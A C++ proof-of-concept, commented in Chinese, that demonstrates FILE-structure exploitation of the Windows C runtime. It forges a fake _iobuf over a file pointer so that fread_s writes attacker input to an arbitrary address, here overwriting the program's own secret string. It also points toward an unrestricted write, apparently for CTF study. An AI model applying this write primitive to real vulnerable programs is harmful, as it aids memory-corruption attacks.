/*
tested on windows 10 x64 19042.630 Release

FILE POC 

大致原理:
    伪造FILE struct
要求:
    能修改某个fp
    调用
        fopen_s
        fread_s //trigger
预期效果:
    任意地址写
注意:
    当前的任意地址写是受限制的, 具体参照wctf那个题
    想要提升到不受限的任意地址写, 可以参考61,62行的注释

refer: https://github.com/scwuaptx/LazyFragmentationHeap/
       http://blog.eonew.cn/archives/1253
*/

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <io.h>

LPVOID ptr[0x20];
char secret[] = "th1s_1s_s3cret";

void init() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
}

typedef struct _iobuf FILE;
int main()
{
    init();
    
    printf("secret: %s\n", secret);
    FILE* fp = NULL;
    char buf[0x200]{ 0 };
    fopen_s(&fp, "test.txt", "rb");
    if (!fp) {
        puts("Bad :(");
        return 1;
    }
    // 任意地址写的fake_file
    /*
    obj = p64(0) + p64(base) + p32(cnt) + p32(flag) + p32(fd) + p32(0) + p64(bufsize) + p64(0)
    obj += p64(0xffffffffffffffff) + p32(0xffffffff) + p32(0) + p64(0)*2
    */
    void* fake_file_struct = new char[0x100]{ 0 };
    void* p = fake_file_struct;
    *(UINT64*)p = 0; p = (void*)((intptr_t)p + sizeof(UINT64)); // _ptr
    *(UINT64*)p = (UINT64)secret; p = (void*)((intptr_t)p + sizeof(UINT64)); // _base, 这里设置为一个指针
    *(UINT32*)p = 0; p = (void*)((intptr_t)p + sizeof(UINT32)); // cnt
    *(UINT32*)p = 0x2049; p = (void*)((intptr_t)p + sizeof(UINT32)); // _flag 没整明白为啥.
    // 0x2049 -> 修改ucrtbase!_pioinfo[0].flag(_pioinfo+0x38)的byte为0x9, 避免0x1a截断
    // 0x2080 -> 修改ucrtbase!_pioinfo[0].flag(_pioinfo+0x38)的byte为0x38, 避免0x1a截断

    *(UINT32*)p = 0; p = (void*)((intptr_t)p + sizeof(UINT32)); // fd, fileno
    *(UINT32*)p = 0; p = (void*)((intptr_t)p + sizeof(UINT32)); // pad
    *(UINT64*)p = 0x200; p = (void*)((intptr_t)p + sizeof(UINT64)); // _bufsiz, 应该是最大的size?
    *(UINT64*)p = 0; p = (void*)((intptr_t)p + sizeof(UINT64));
    *(UINT64*)p = 0xffffffffffffffff; p = (void*)((intptr_t)p + sizeof(UINT64));
    *(UINT32*)p = 0xffffffff; p = (void*)((intptr_t)p + sizeof(UINT32));
    *(UINT32*)p = 0; p = (void*)((intptr_t)p + sizeof(UINT32)); 
    *(UINT64*)p = 0; p = (void*)((intptr_t)p + sizeof(UINT64));
    *(UINT64*)p = 0; p = (void*)((intptr_t)p + sizeof(UINT64));
    memcpy(fp, fake_file_struct, (intptr_t)p - (intptr_t)fake_file_struct);

    size_t input_size = 4; // 这里的size是多少, 之后就必须输入多长
    fread_s(buf, input_size, 1, input_size, fp);
    // 输入 `hack`
    printf("%s\n",buf);
    printf("secret: %s", secret);
    return 0;
}
